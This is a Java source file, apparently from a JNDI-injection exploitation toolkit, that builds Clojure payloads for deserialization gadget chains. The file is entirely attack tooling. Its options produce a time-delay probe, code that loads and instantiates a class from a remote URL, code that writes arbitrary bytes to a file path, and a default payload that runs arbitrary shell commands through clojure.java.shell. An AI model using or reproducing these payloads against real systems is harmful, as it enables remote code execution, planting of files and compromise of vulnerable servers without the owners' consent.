package com.qi4l.jndi.gadgets.utils.clojure;

import com.qi4l.jndi.gadgets.utils.StringUtil;
import com.qi4l.jndi.gadgets.utils.Utils;

import java.util.Arrays;

public class ClojureUtil {

    public static String makeClojurePayload(String command) {
        if (command.startsWith("TS-"))
            return String.format("(java.lang.Thread/sleep " + (Integer.parseInt(command.split("[-]")[1]) * 1000) + ")", new Object[0]);
        if (command.startsWith("RC-")) {
            String[] strings = Utils.handlerCommand(command);
            return "(def urlStr (new String \"" + strings[0] + "\"))\n(def url (new java.net.URL urlStr))\n(def loader (new java.net.URLClassLoader (into-array [url])))\n(def clazz (.loadClass loader \"" + strings[1] + "\"))\n(.newInstance clazz)";
        }
        if (command.startsWith("WF-")) {
            String[] strings = Utils.handlerCommand(command);
            return "(def path (new String \"" + strings[0] + "\"))\n(def out (new java.io.FileOutputStream path))\n(def byts (.getObject \"" + strings[1] + "\"))\n(.write out byts)";
        }
        String cmd = StringUtil.join(Arrays.asList(command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\").split(" ")), " ", "\"", "\"");
        return String.format("(use '[clojure.java.shell :only [sh]]) (sh %s)(println \"QI4L\")", new Object[]{cmd});
    }

}
